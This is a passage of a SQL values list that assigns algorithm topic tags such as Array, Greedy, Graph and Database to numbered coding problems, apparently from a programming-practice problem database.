Pointers',1721),(5138,'Array',1722),(5139,'Depth-First Search',1722),(5140,'Union Find',1722),(5141,'Array',1723),(5142,'Dynamic Programming',1723),(5143,'Backtracking',1723),(5144,'Bit Manipulation',1723),(5145,'Bitmask',1723),(5146,'Union Find',1724),(5147,'Graph',1724),(5148,'Minimum Spanning Tree',1724),(5149,'Array',1725),(5150,'Array',1726),(5151,'Hash Table',1726),(5152,'Array',1727),(5153,'Greedy',1727),(5154,'Sorting',1727),(5155,'Matrix',1727),(5156,'Array',1728),(5157,'Math',1728),(5158,'Dynamic Programming',1728),(5159,'Graph',1728),(5160,'Topological Sort',1728),(5161,'Memoization',1728),(5162,'Matrix',1728),(5163,'Game Theory',1728),(5164,'Database',1729),(5165,'Array',1730),(5166,'Breadth-First Search',1730),(5167,'Matrix',1730),(5168,'Database',1731),(5169,'Array',1732),(5170,'Prefix Sum',1732),(5171,'Array',1733),(5172,'Greedy',1733),(5173,'Array',1734),(5174,'Bit Manipulation',1734),(5175,'Array',1735),(5176,'Math',1735),(5177,'Dynamic Programming',1735),(5178,'Combinatorics',1735),(5179,'Number Theory',1735),(5180,'String',1736),(5181,'Greedy',1736),(5182,'Hash Table',1737),(5183,'String',1737),(5184,'Counting',1737),(5185,'Prefix Sum',1737),(5186,'Array',1738),(5187,'Divide and Conquer',1738),(5188,'Bit Manipulation',1738),(5189,'Heap (Priority Queue)',1738),(5190,'Matrix',1738),(5191,'Prefix Sum',1738),(5192,'Quickselect',1738),(5193,'Math',1739),(5194,'Binary Search',1739),(5195,'Greedy',1739),(5196,'Hash Table',1740),(5197,'Tree',1740),(5198,'Depth-First Search',1740),(5199,'Breadth-First Search',1740),(5200,'Binary Tree',1740),(5201,'Database',1741),(5202,'Hash Table',1742),(5203,'Math',1742),(5204,'Counting',1742),(5205,'Array',1743),(5206,'Hash Table',1743),(5207,'Array',1744),(5208,'Prefix Sum',1744),(5209,'String',1745),(5210,'Dynamic Programming',1745),(5211,'Array',1746),(5212,'Dynamic Programming',1746),(5213,'Database',1747),(5214,'Array',1748),(5215,'Hash Table',1748),(5216,'Counting',1748),(5217,'Array',1749),(5218,'Dynamic Programming',1749),(5219,'Two Pointers',1750),(5220,'String',1750),(5221,'Array',1751),(5222,'Binary Search',1751),(5223,'Dynamic Programming',1751),(5224,'Sorting',1751),(5225,'Array',1752),(5226,'Math',1753),(5227,'Greedy',1753),(5228,'Heap (Priority Queue)',1753),(5229,'Two Pointers',1754),(5230,'String',1754),(5231,'Greedy',1754),(5232,'Array',1755),(5233,'Two Pointers',1755),(5234,'Dynamic Programming',1755),(5235,'Bit Manipulation',1755),(5236,'Bitmask',1755),(5237,'Array',1756),(5238,'Hash Table',1756),(5239,'Stack',1756),(5240,'Design',1756),(5241,'Binary Indexed Tree',1756),(5242,'Ordered Set',1756),(5243,'Database',1757),(5244,'String',1758),(5245,'Math',1759),(5246,'String',1759),(5247,'Array',1760),(5248,'Binary Search',1760),(5249,'Graph',1761),(5250,'Array',1762),(5251,'Stack',1762),(5252,'Monotonic Stack',1762),(5253,'Hash Table',1763),(5254,'String',1763),(5255,'Divide and Conquer',1763),(5256,'Bit Manipulation',1763),(5257,'Sliding Window',1763),(5258,'Array',1764),(5259,'Greedy',1764),(5260,'String Matching',1764),(5261,'Array',1765),(5262,'Breadth-First Search',1765),(5263,'Matrix',1765),(5264,'Math',1766),(5265,'Tree',1766),(5266,'Depth-First Search',1766),(5267,'Breadth-First Search',1766),(5268,'Database',1767),(5269,'Two Pointers',1768),(5270,'String',1768),(5271,'Array',1769),(5272,'String',1769),(5273,'Array',1770),(5274,'Dynamic Programming',1770),(5275,'String',1771),(5276,'Dynamic Programming',1771),(5277,'Array',1772),(5278,'Hash Table',1772),(5279,'String',1772),(5280,'Sorting',1772),(5281,'Array',1773),(5282,'String',1773),(5283,'Array',1774),(5284,'Dynamic Programming',1774),(5285,'Backtracking',1774),(5286,'Array',1775),(5287,'Hash Table',1775),(5288,'Greedy',1775),(5289,'Counting',1775),(5290,'Array',1776),(5291,'Math',1776),(5292,'Stack',1776),(5293,'Heap (Priority Queue)',1776),(5294,'Monotonic Stack',1776),(5295,'Database',1777),(5296,'Depth-First Search',1778),(5297,'Breadth-First Search',1778),(5298,'Graph',1778),(5299,'Interactive',1778),(5300,'Array',1779),(5301,'Math',1780),(5302,'Hash Table',1781),(5303,'String',1781),(5304,'Counting',1781),(5305,'Array',1782),(5306,'Two Pointers',1782),(5307,'Binary Search',1782),(5308,'Graph',1782),(5309,'Sorting',1782),(5310,'Database',1783),(5311,'String',1784),(5312,'Array',1785),(5313,'Greedy',1785),(5314,'Dynamic Programming',1786),(5315,'Graph',1786),(5316,'Topological Sort',1786),(5317,'Heap (Priority Queue)',1786),(5318,'Shortest Path',1786),(5319,'Array',1787),(5320,'Dynamic Programming',1787),(5321,'Bit Manipulation',1787),(5322,'Array',1788),(5323,'Greedy',1788),(5324,'Prefix Sum',1788),(5325,'Database',1789),(5326,'Hash Table',1790),(5327,'String',1790),(5328,'Counting',1790),(5329,'Graph',1791),(5330,'Array',1792),(5331,'Greedy',1792),(5332,'Heap (Priority Queue)',1792),(5333,'Array',1793),(5334,'Two Pointers',1793),(5335,'Binary Search',1793),(5336,'Stack',1793),(5337,'Monotonic Stack',1793),(5338,'Hash Table',1794),(5339,'String',1794),(5340,'Greedy',1794),(5341,'Database',1795),(5342,'Hash Table',1796),(5343,'String',1796),(5344,'Hash Table',1797),(5345,'Design',1797),(5346,'Array',1798),(5347,'Greedy',1798),(5348,'Array',1799),(5349,'Math',1799),(5350,'Dynamic Programming',1799),(5351,'Backtracking',1799),(5352,'Bit Manipulation',1799),(5353,'Number Theory',1799),(5354,'Bitmask',1799),(5355,'Array',1800),(5356,'Array',1801),(5357,'Heap (Priority Queue)',1801),(5358,'Simulation',1801),(5359,'Binary Search',1802),(5360,'Greedy',1802),(5361,'Array',1803),(5362,'Bit Manipulation',1803),(5363,'Trie',1803),(5364,'Hash Table',1804),(5365,'String',1804),(5366,'Design',1804),(5367,'Trie',1804),(5368,'Hash Table',1805),(5369,'String',1805),(5370,'Array',1806),(5371,'Math',1806),(5372,'Simulation',1806),(5373,'Array',1807),(5374,'Hash Table',1807),(5375,'String',1807),(5376,'Math',1808),(5377,'Recursion',1808),(5378,'Database',1809),(5379,'Depth-First Search',1810),(5380,'Breadth-First Search',1810),(5381,'Graph',1810),(5382,'Heap (Priority Queue)',1810),(5383,'Interactive',1810),(5384,'Database',1811),(5385,'Math',1812),(5386,'String',1812),(5387,'Array',1813),(5388,'Two Pointers',1813),(5389,'String',1813),(5390,'Array',1814),(5391,'Hash Table',1814),(5392,'Math',1814),(5393,'Counting',1814),(5394,'Array',1815),(5395,'Dynamic Programming',1815),(5396,'Bit Manipulation',1815),(5397,'Memoization',1815),(5398,'Bitmask',1815),(5399,'Array',1816),(5400,'String',1816),(5401,'Array',1817),(5402,'Hash Table',1817),(5403,'Array',1818),(5404,'Binary Search',1818),(5405,'Sorting',1818),(5406,'Ordered Set',1818),(5407,'Array',1819),(5408,'Math',1819),(5409,'Counting',1819),(5410,'Number Theory',1819),(5411,'Array',1820),(5412,'Backtracking',1820),(5413,'Matrix',1820),(5414,'Database',1821),(5415,'Array',1822),(5416,'Math',1822),(5417,'Array',1823),(5418,'Math',1823),(5419,'Recursion',1823),(5420,'Queue',1823),(5421,'Simulation',1823),(5422,'Array',1824),(5423,'Dynamic Programming',1824),(5424,'Greedy',1824),(5425,'Design',1825),(5426,'Queue',1825),(5427,'Heap (Priority Queue)',1825),(5428,'Data Stream',1825),(5429,'Ordered Set',1825),(5430,'Array',1826),(5431,'Two Pointers',1826),(5432,'Array',1827),(5433,'Greedy',1827),(5434,'Array',1828),(5435,'Math',1828),(5436,'Geometry',1828),(5437,'Array',1829),(5438,'Bit Manipulation',1829),(5439,'Prefix Sum',1829),(5440,'Math',1830),(5441,'String',1830),(5442,'Combinatorics',1830),(5443,'Database',1831),(5444,'Hash Table',1832),(5445,'String',1832),(5446,'Array',1833),(5447,'Greedy',1833),(5448,'Sorting',1833),(5449,'Array',1834),(5450,'Sorting',1834),(5451,'Heap (Priority Queue)',1834),(5452,'Array',1835),(5453,'Math',1835),(5454,'Bit Manipulation',1835),(5455,'Hash Table',1836),(5456,'Linked List',1836),(5457,'Math',1837),(5458,'Array',1838),(5459,'Binary Search',1838),(5460,'Greedy',1838),(5461,'Sliding Window',1838),(5462,'Sorting',1838),(5463,'Prefix Sum',1838),(5464,'String',1839),(5465,'Sliding Window',1839),(5466,'Array',1840),(5467,'Math',1840),(5468,'Database',1841),(5469,'Two Pointers',1842),(5470,'String',1842),(5471,'Database',1843),(5472,'String',1844),(5473,'Design',1845),(5474,'Heap (Priority Queue)',1845),(5475,'Array',1846),(5476,'Greedy',1846),(5477,'Sorting',1846),(5478,'Array',1847),(5479,'Binary Search',1847),(5480,'Sorting',1847),(5481,'Array',1848),(5482,'String',1849),(5483,'Backtracking',1849),(5484,'Two Pointers',1850),(5485,'String',1850),(5486,'Greedy',1850),(5487,'Array',1851),(5488,'Binary Search',1851),(5489,'Line Sweep',1851),(5490,'Sorting',1851),(5491,'Heap (Priority Queue)',1851),(5492,'Array',1852),(5493,'Hash Table',1852),(5494,'Sliding Window',1852),(5495,'Database',1853),(5496,'Array',1854),(5497,'Counting',1854),(5498,'Array',1855),(5499,'Two Pointers',1855),(5500,'Binary Search',1855),(5501,'Greedy',1855),(5502,'Array',1856),(5503,'Stack',1856),(5504,'Monotonic Stack',1856),(5505,'Prefix Sum',1856),(5506,'Hash Table',1857),(5507,'Dynamic Programming',1857),(5508,'Graph',1857),(5509,'Topological Sort',1857),(5510,'Memoization',1857),(5511,'Counting',1857),(5512,'Depth-First Search',1858),(5513,'Trie',1858),(5514,'String',1859),(5515,'Sorting',1859),(5516,'Simulation',1860),(5517,'Array',1861),(5518,'Two Pointers',1861),(5519,'Matrix',1861),(5520,'Array',1862),(5521,'Math',1862),(5522,'Binary Search',1862),(5523,'Prefix Sum',1862),(5524,'Array',1863),(5525,'Math',1863),(5526,'Backtracking',1863),(5527,'Bit Manipulation',1863),(5528,'Combinatorics',1863),(5529,'String',1864),(5530,'Greedy',1864),(5531,'Array',1865),(5532,'Hash Table',1865),(5533,'Design',1865),(5534,'Math',1866),(5535,'Dynamic Programming',1866),(5536,'Combinatorics',1866),(5537,'Database',1867),(5538,'Array',1868),(5539,'Two Pointers',1868),(5540,'String',1869),(5541,'Array',1870),(5542,'Binary Search',1870),(5543,'String',1871),(5544,'Dynamic Programming',1871),(5545,'Sliding Window',1871),(5546,'Prefix Sum',1871),(5547,'Array',1872),(5548,'Math',1872),(5549,'Dynamic Programming',1872),(5550,'Prefix Sum',1872),(5551,'Game Theory',1872),(5552,'Database',1873),(5553,'Array',1874),(5554,'Greedy',1874),(5555,'Sorting',1874),(5556,'Database',1875),(5557,'Hash Table',1876),(5558,'String',1876),(5559,'Sliding Window',1876),(5560,'Counting',1876),(5561,'Array',1877),(5562,'Two Pointers',1877),(5563,'Greedy',1877),(5564,'Sorting',1877),(5565,'Array',1878),(5566,'Math',1878),(5567,'Sorting',1878),(5568,'Heap (Priority Queue)',1878),(5569,'Matrix',1878),(5570,'Prefix Sum',1878),(5571,'Array',1879),(5572,'Dynamic Programming',1879),(5573,'Bit Manipulation',1879),(5574,'Bitmask',1879),(5575,'String',1880),(5576,'String',1881),(5577,'Greedy',1881),(5578,'Array',1882),(5579,'Heap (Priority Queue)',1882),(5580,'Array',1883),(5581,'Dynamic Programming',1883),(5582,'Math',1884),(5583,'Dynamic Programming',1884),(5584,'Array',1885),(5585,'Two Pointers',1885),(5586,'Binary Search',1885),(5587,'Sorting',1885),(5588,'Array',1886),(5589,'Matrix',1886),(5590,'Array',1887),(5591,'Sorting',1887),(5592,'String',1888),(5593,'Dynamic Programming',1888),(5594,'Greedy',1888),(5595,'Sliding Window',1888),(5596,'Array',1889),(5597,'Binary Search',1889),(5598,'Sorting',1889),(5599,'Prefix Sum',1889),(5600,'Database',1890),(5601,'Array',1891),(5602,'Binary Search',1891),(5603,'Database',1892),(5604,'Array',1893),(5605,'Hash Table',1893),(5606,'Prefix Sum',1893),(5607,'Array',1894),(5608,'Binary Search',1894),(5609,'Simulation',1894),(5610,'Prefix Sum',1894),(5611,'Array',1895),(5612,'Matrix',1895),(5613,'Prefix Sum',1895),(5614,'Math',1896),(5615,'String',1896),(5616,'Dynamic Programming',1896),(5617,'Stack',1896),(5618,'Hash Table',1897),(5619,'String',1897),(5620,'Counting',1897),(5621,'Array',1898),(5622,'String',1898),(5623,'Binary Search',1898),(5624,'Array',1899),(5625,'Greedy',1899),(5626,'Dynamic Programming',1900),(5627,'Memoization',1900),(5628,'Array',1901),(5629,'Binary Search',1901),(5630,'Matrix',1901),(5631,'Tree',1902),(5632,'Binary Search Tree',1902),(5633,'Binary Tree',1902),(5634,'Ordered Set',1902),(5635,'Math',1903),(5636,'String',1903),(5637,'Greedy',1903),(5638,'Math',1904),(5639,'String',1904),(5640,'Array',1905),(5641,'Depth-First Search',1905),(5642,'Breadth-First Search',1905),(5643,'Union Find',1905),(5644,'Matrix',1905),(5645,'Array',1906),(5646,'Hash Table',1906),(5647,'Database',1907),(5648,'Array',1908),(5649,'Math',1908),(5650,'Dynamic Programming',1908),(5651,'Bit Manipulation',1908),(5652,'Brainteaser',1908),(5653,'Game Theory',1908),(5654,'Array',1909),(5655,'String',1910),(5656,'Array',1911),(5657,'Dynamic Programming',1911),(5658,'Array',1912),(5659,'Hash Table',1912),(5660,'Design',1912),(5661,'Heap (Priority Queue)',1912),(5662,'Ordered Set',1912),(5663,'Array',1913),(5664,'Sorting',1913),(5665,'Array',1914),(5666,'Matrix',1914),(5667,'Simulation',1914),(5668,'Hash Table',1915),(5669,'String',1915),(5670,'Bit Manipulation',1915),(5671,'Prefix Sum',1915),(5672,'Math',1916),(5673,'Dynamic Programming',1916),(5674,'Tree',1916),(5675,'Graph',1916),(5676,'Topological Sort',1916),(5677,'Combinatorics',1916),(5678,'Database',1917),(5679,'Array',1918),(5680,'Binary Search',1918),(5681,'Sliding Window',1918),(5682,'Database',1919),(5683,'Array',1920),(5684,'Simulation',1920),(5685,'Array',1921),(5686,'Greedy',1921),(5687,'Sorting',1921),(5688,'Math',1922),(5689,'Recursion',1922),(5690,'Array',1923),(5691,'Binary Search',1923),(5692,'Rolling Hash',1923),(5693,'Suffix Array',1923),(5694,'Hash Function',1923),(5695,'Array',1924),(5696,'Math',1924),(5697,'Geometry',1924),(5698,'Math',1925),(5699,'Enumeration',1925),(5700,'Array',1926),(5701,'Breadth-First Search',1926),(5702,'Matrix',1926),(5703,'Math',1927),(5704,'Greedy',1927),(5705,'Game Theory',1927),(5706,'Dynamic Programming',1928),(5707,'Graph',1928),(5708,'Array',1929),(5709,'Hash Table',1930),(5710,'String',1930),(5711,'Prefix Sum',1930),(5712,'Dynamic Programming',1931),(5713,'Hash Table',1932),(5714,'Binary Search',1932),(5715,'Tree',1932),(5716,'Depth-First Search',1932),(5717,'Binary Tree',1932),(5718,'String',1933),(5719,'Database',1934),(5720,'Hash Table',1935),(5721,'String',1935),(5722,'Array',1936),(5723,'Greedy',1936),(5724,'Array',1937),(5725,'Dynamic Programming',1937),(5726,'Array',1938),(5727,'Bit Manipulation',1938),(5728,'Trie',1938),(5729,'Database',1939),(5730,'Array',1940),(5731,'Hash Table',1940),(5732,'Counting',1940),(5733,'Hash Table',1941),(5734,'String',1941),(5735,'Counting',1941),(5736,'Array',1942),(5737,'Heap (Priority Queue)',1942),(5738,'Ordered Set',1942),(5739,'Array',1943),(5740,'Prefix Sum',1943),(5741,'Array',1944),(5742,'Stack',1944),(5743,'Monotonic Stack',1944),(5744,'String',1945),(5745,'Simulation',1945),(5746,'Array',1946),(5747,'String',1946),(5748,'Greedy',1946),(5749,'Array',1947),(5750,'Dynamic Programming',1947),(5751,'Backtracking',1947),(5752,'Bit Manipulation',1947),(5753,'Bitmask',1947),(5754,'Array',1948),(5755,'Hash Table',1948),(5756,'String',1948),(5757,'Trie',1948),(5758,'Hash Function',1948),(5759,'Database',1949),(5760,'Array',1950),(5761,'Stack',1950),(5762,'Monotonic Stack',1950),(5763,'Database',1951),(5764,'Math',1952),(5765,'Array',1953),(5766,'Greedy',1953),(5767,'Math',1954),(5768,'Binary Search',1954),(5769,'Array',1955),(5770,'Dynamic Programming',1955),(5771,'Array',1956),(5772,'Math',1956),(5773,'Binary Search',1956),(5774,'Geometry',1956),(5775,'Enumeration',1956),(5776,'String',1957),(5777,'Array',1958),(5778,'Matrix',1958),(5779,'Enumeration',1958),(5780,'Array',1959),(5781,'Dynamic Programming',1959),(5782,'String',1960),(5783,'Rolling Hash',1960),(5784,'Hash Function',1960),(5785,'Array',1961),(5786,'String',1961),(5787,'Array',1962),(5788,'Greedy',1962),(5789,'Heap (Priority Queue)',1962),(5790,'Two Pointers',1963),(5791,'String',1963),(5792,'Stack',1963),(5793,'Greedy',1963),(5794,'Array',1964),(5795,'Binary Search',1964),(5796,'Binary Indexed Tree',1964),(5797,'Database',1965),(5798,'Array',1966),(5799,'Binary Search',1966),(5800,'String',1967),(5801,'Array',1968),(5802,'Greedy',1968),(5803,'Sorting',1968),(5804,'Math',1969),(5805,'Greedy',1969),(5806,'Recursion',1969),(5807,'Array',1970),(5808,'Binary Search',1970),(5809,'Depth-First Search',1970),(5810,'Breadth-First Search',1970),(5811,'Union Find',1970),(5812,'Matrix',1970),(5813,'Depth-First Search',1971),(5814,'Breadth-First Search',1971),(5815,'Union Find',1971),(5816,'Graph',1971),(5817,'Database',1972),(5818,'Tree',1973),(5819,'Depth-First Search',1973),(5820,'Binary Search Tree',1973),(5821,'Binary Tree',1973),(5822,'String',1974),(5823,'Greedy',1974),(5824,'Array',1975),(5825,'Greedy',1975),(5826,'Matrix',1975),(5827,'Dynamic Programming',1976),(5828,'Graph',1976),(5829,'Topological Sort',1976),(5830,'Shortest Path',1976),(5831,'String',1977),(5832,'Dynamic Programming',1977),(5833,'Suffix Array',1977),(5834,'Database',1978),(5835,'Array',1979),(5836,'Math',1979),(5837,'Number Theory',1979),(5838,'Array',1980),(5839,'String',1980),(5840,'Backtracking',1980),(5841,'Array',1981),(5842,'Dynamic Programming',1981),(5843,'Matrix',1981),(5844,'Array',1982),(5845,'Divide and Conquer',1982),(5846,'Array',1983),(5847,'Hash Table',1983),(5848,'Prefix Sum',1983),(5849,'Array',1984),(5850,'Sliding Window',1984),(5851,'Sorting',1984),(5852,'Array',1985),(5853,'String',1985),(5854,'Divide and Conquer',1985),(5855,'Sorting',1985),(5856,'Heap (Priority Queue)',1985),(5857,'Quickselect',1985),(5858,'Array',1986),(5859,'Dynamic Programming',1986),(5860,'Backtracking',1986),(5861,'Bit Manipulation',1986),(5862,'Bitmask',1986),(5863,'String',1987),(5864,'Dynamic Programming',1987),(5865,'Database',1988),(5866,'Array',1989),(5867,'Greedy',1989),(5868,'Database',1990),(5869,'Array',1991),(5870,'Prefix Sum',1991),(5871,'Array',1992),(5872,'Depth-First Search',1992),(5873,'Breadth-First Search',1992),(5874,'Matrix',1992),(5875,'Array',1993),(5876,'Hash Table',1993),(5877,'Tree',1993),(5878,'Depth-First Search',1993),(5879,'Breadth-First Search',1993),(5880,'Design',1993),(5881,'Array',1994),(5882,'Math',1994),(5883,'Dynamic Programming',1994),(5884,'Bit Manipulation',1994),(5885,'Bitmask',1994),(5886,'Array',1995),(5887,'Enumeration',1995),(5888,'Array',1996),(5889,'Stack',1996),(5890,'Greedy',1996),(5891,'Sorting',1996),(5892,'Monotonic Stack',1996),(5893,'Array',1997),(5894,'Dynamic Programming',1997),(5895,'Array',1998),(5896,'Math',1998),(5897,'Union Find',1998),(5898,'Sorting',1998),(5899,'Number Theory',1998),(5900,'Math',1999),(5901,'Enumeration',1999),(5902,'Two Pointers',2000),(5903,'String',2000),(5904,'Array',2001),(5905,'Hash Table',2001),(5906,'Math',2001),(5907,'Counting',2001),(5908,'Number Theory',2001),(5909,'String',2002),(5910,'Dynamic Programming',2002),(5911,'Backtracking',2002),(5912,'Bit Manipulation',2002),(5913,'Bitmask',2002),(5914,'Dynamic Programming',2003),(5915,'Tree',2003),(5916,'Depth-First Search',2003),(5917,'Union Find',2003),(5918,'Database',2004),(5919,'Math',2005),(5920,'Dynamic Programming',2005),(5921,'Tree',2005),(5922,'Binary Tree',2005),(5923,'Game Theory',2005),(5924,'Array',2006),(5925,'Hash Table',2006),(5926,'Counting',2006),(5927,'Array',2007),(5928,'Hash Table',2007),(5929,'Greedy',2007),(5930,'Sorting',2007),(5931,'Array',2008),(5932,'Binary Search',2008),(5933,'Dynamic Programming',2008),(5934,'Sorting',2008),(5935,'Array',2009),(5936,'Binary Search',2009),(5937,'Database',2010),(5938,'Array',2011),(5939,'String',2011),(5940,'Simulation',2011),(5941,'Array',2012),(5942,'Array',2013),(5943,'Hash Table',2013),(5944,'Design',2013),(5945,'Counting',2013),(5946,'String',2014),(5947,'Backtracking',2014),(5948,'Greedy',2014),(5949,'Counting',2014),(5950,'Enumeration',2014),(5951,'Array',2015),(5952,'Greedy',2015),(5953,'Sorting',2015),(5954,'Heap (Priority Queue)',2015),(5955,'Array',2016),(5956,'Array',2017),(5957,'Matrix',2017),(5958,'Prefix Sum',2017),(5959,'Array',2018),(5960,'Matrix',2018),(5961,'Enumeration',2018),(5962,'Array',2019),(5963,'Math',2019),(5964,'String',2019),(5965,'Dynamic Programming',2019),(5966,'Stack',2019),(5967,'Memoization',2019),(5968,'Database',2020),(5969,'Array',2021),(5970,'Prefix Sum',2021),(5971,'Ordered Set',2021),(5972,'Array',2022),(5973,'Matrix',2022),(5974,'Simulation',2022),(5975,'Array',2023),(5976,'String',2023),(5977,'String',2024),(5978,'Binary Search',2024),(5979,'Sliding Window',2024),(5980,'Prefix Sum',2024),(5981,'Array',2025),(5982,'Hash Table',2025),(5983,'Counting',2025),(5984,'Enumeration',2025),(5985,'Prefix Sum',2025),(5986,'Database',2026),(5987,'String',2027),(5988,'Greedy',2027),(5989,'Array',2028),(5990,'Math',2028),(5991,'Simulation',2028),(5992,'Array',2029),(5993,'Math',2029),(5994,'Greedy',2029),(5995,'Counting',2029),(5996,'Game Theory',2029),(5997,'String',2030),(5998,'Stack',2030),(5999,'Greedy',2030),(6000,'Monotonic Stack',2030),(6001,'Array',2031),(6002,'Binary Search',2031),(6003,'Divide and Conquer',2031),(6004,'Binary Indexed Tree',2031),(6005,'Segment Tree',2031),(6006,'Merge Sort',2031),(6007,'Ordered Set',2031),(6008,'Array',2032),(6009,'Hash Table',2032),(6010,'Array',2033),(6011,'Math',2033),(6012,'Sorting',2033),(6013,'Matrix',2033),(6014,'Hash Table',2034),(6015,'Design',2034),(6016,'Heap (Priority Queue)',2034),(6017,'Data Stream',2034),(6018,'Ordered Set',2034),(6019,'Array',2035),(6020,'Two Pointers',2035),(6021,'Binary Search',2035),(6022,'Dynamic Programming',2035),(6023,'Bit Manipulation',2035),(6024,'Ordered Set',2035),(6025,'Bitmask',2035),(6026,'Array',2036),(6027,'Dynamic Programming',2036),(6028,'Array',2037),(6029,'Sorting',2037),(6030,'Math',2038),(6031,'String',2038),(6032,'Greedy',2038),(6033,'Game Theory',2038),(6034,'Array',2039),(6035,'Breadth-First Search',2039),(6036,'Graph',2039),(6037,'Array',2040),(6038,'Binary Search',2040),(6039,'Database',2041),(6040,'String',2042),(6041,'Array',2043),(6042,'Hash Table',2043),(6043,'Design',2043),(6044,'Simulation',2043),(6045,'Array',2044),(6046,'Backtracking',2044),(6047,'Bit Manipulation',2044),(6048,'Breadth-First Search',2045),(6049,'Graph',2045),(6050,'Shortest Path',2045),(6051,'Linked List',2046),(6052,'Two Pointers',2046),(6053,'Sorting',2046),(6054,'String',2047),(6055,'Math',2048),(6056,'Backtracking',2048),(6057,'Enumeration',2048),(6058,'Array',2049),(6059,'Tree',2049),(6060,'Depth-First Search',2049),(6061,'Binary Tree',2049),(6062,'Array',2050),(6063,'Dynamic Programming',2050),(6064,'Graph',2050),(6065,'Topological Sort',2050),(6066,'Database',2051),(6067,'Array',2052),(6068,'Dynamic Programming',2052),(6069,'Array',2053),(6070,'Hash Table',2053),(6071,'String',2053),(6072,'Counting',2053),(6073,'Array',2054),(6074,'Binary Search',2054),(6075,'Dynamic Programming',2054),(6076,'Sorting',2054),(6077,'Heap (Priority Queue)',2054),(6078,'Array',2055),(6079,'String',2055),(6080,'Binary Search',2055),(6081,'Prefix Sum',2055),(6082,'Array',2056),(6083,'String',2056),(6084,'Backtracking',2056),(6085,'Simulation',2056),(6086,'Array',2057),(6087,'Linked List',2058),(6088,'Array',2059),(6089,'Breadth-First Search',2059),(6090,'String',2060),(6091,'Dynamic Programming',2060),(6092,'Array',2061),(6093,'Matrix',2061),(6094,'Simulation',2061),(6095,'Hash Table',2062),(6096,'String',2062),(6097,'Math',2063),(6098,'String',2063),(6099,'Dynamic Programming',2063),(6100,'Combinatorics',2063),(6101,'Array',2064),(6102,'Binary Search',2064),(6103,'Array',2065),(6104,'Backtracking',2065),(6105,'Graph',2065),(6106,'Database',2066),(6107,'String',2067),(6108,'Counting',2067),(6109,'Prefix Sum',2067),(6110,'Hash Table',2068),(6111,'String',2068),(6112,'Counting',2068),(6113,'Design',2069),(6114,'Simulation',2069),(6115,'Array',2070),(6116,'Binary Search',2070),(6117,'Sorting',2070),(6118,'Array',2071),(6119,'Binary Search',2071),(6120,'Greedy',2071),(6121,'Queue',2071),(6122,'Sorting',2071),(6123,'Monotonic Queue',2071),(6124,'Database',2072),(6125,'Array',2073),(6126,'Queue',2073),(6127,'Simulation',2073),(6128,'Linked List',2074),(6129,'String',2075),(6130,'Simulation',2075),(6131,'Union Find',2076),(6132,'Graph',2076),(6133,'Graph',2077),(6134,'Array',2078),(6135,'Greedy',2078),(6136,'Array',2079),(6137,'Array',2080),(6138,'Hash Table',2080),(6139,'Binary Search',2080),(6140,'Design',2080),(6141,'Segment Tree',2080),(6142,'Math',2081),(6143,'Enumeration',2081),(6144,'Database',2082),(6145,'Hash Table',2083),(6146,'Math',2083),(6147,'String',2083),(6148,'Counting',2083),(6149,'Prefix Sum',2083),(6150,'Database',2084),(6151,'Array',2085),(6152,'Hash Table',2085),(6153,'String',2085),(6154,'Counting',2085),(6155,'String',2086),(6156,'Dynamic Programming',2086),(6157,'Greedy',2086),(6158,'Array',2087),(6159,'Greedy',2087),(6160,'Matrix',2087),(6161,'Array',2088),(6162,'Dynamic Programming',2088),(6163,'Matrix',2088),(6164,'Array',2089),(6165,'Binary Search',2089),(6166,'Sorting',2089),(6167,'Array',2090),(6168,'Sliding Window',2090),(6169,'Array',2091),(6170,'Greedy',2091),(6171,'Depth-First Search',2092),(6172,'Breadth-First Search',2092),(6173,'Union Find',2092),(6174,'Graph',2092),(6175,'Sorting',2092),(6176,'Graph',2093),(6177,'Heap (Priority Queue)',2093),(6178,'Shortest Path',2093),(6179,'Array',2094),(6180,'Hash Table',2094),(6181,'Sorting',2094),(6182,'Enumeration',2094),(6183,'Linked List',2095),(6184,'Two Pointers',2095),(6185,'String',2096),(6186,'Tree',2096),(6187,'Depth-First Search',2096),(6188,'Binary Tree',2096),(6189,'Depth-First Search',2097),(6190,'Graph',2097),(6191,'Eulerian Circuit',2097),(6192,'Array',2098),(6193,'Greedy',2098),(6194,'Sorting',2098),(6195,'Array',2099),(6196,'Hash Table',2099),(6197,'Sorting',2099),(6198,'Heap (Priority Queue)',2099),(6199,'Array',2100),(6200,'Dynamic Programming',2100),(6201,'Prefix Sum',2100),(6202,'Array',2101),(6203,'Math',2101),(6204,'Depth-First Search',2101),(6205,'Breadth-First Search',2101),(6206,'Graph',2101),(6207,'Geometry',2101),(6208,'Design',2102),(6209,'Heap (Priority Queue)',2102),(6210,'Data Stream',2102),(6211,'Ordered Set',2102),(6212,'Hash Table',2103),(6213,'String',2103),(6214,'Array',2104),(6215,'Stack',2104),(6216,'Monotonic Stack',2104),(6217,'Array',2105),(6218,'Two Pointers',2105),(6219,'Simulation',2105),(6220,'Array',2106),(6221,'Binary Search',2106),(6222,'Sliding Window',2106),(6223,'Prefix Sum',2106),(6224,'Array',2107),(6225,'Hash Table',2107),(6226,'Sliding Window',2107),(6227,'Array',2108),(6228,'Two Pointers',2108),(6229,'String',2108),(6230,'Array',2109),(6231,'String',2109),(6232,'Simulation',2109),(6233,'Array',2110),(6234,'Math',2110),(6235,'Dynamic Programming',2110),(6236,'Array',2111),(6237,'Binary Search',2111),(6238,'Database',2112),(6239,'Array',2113),(6240,'Array',2114),(6241,'String',2114),(6242,'Array',2115),(6243,'Hash Table',2115),(6244,'String',2115),(6245,'Graph',2115),(6246,'Topological Sort',2115),(6247,'String',2116),(6248,'Stack',2116),(6249,'Greedy',2116),(6250,'Math',2117),(6251,'Database',2118),(6252,'Math',2119),(6253,'String',2120),(6254,'Simulation',2120),(6255,'Array',2121),(6256,'Hash Table',2121),(6257,'Prefix Sum',2121),(6258,'Array',2122),(6259,'Hash Table',2122),(6260,'Sorting',2122),(6261,'Enumeration',2122),(6262,'Array',2123),(6263,'Graph',2123),(6264,'Matrix',2123),(6265,'String',2124),(6266,'Array',2125),(6267,'Math',2125),(6268,'String',2125),(6269,'Matrix',2125),(6270,'Array',2126),(6271,'Greedy',2126),(6272,'Sorting',2126),(6273,'Depth-First Search',2127),(6274,'Graph',2127),(6275,'Topological Sort',2127),(6276,'Array',2128),(6277,'Math',2128),(6278,'Bit Manipulation',2128),(6279,'Matrix',2128),(6280,'String',2129),(6281,'Linked List',2130),(6282,'Two Pointers',2130),(6283,'Stack',2130),(6284,'Array',2131),(6285,'Hash 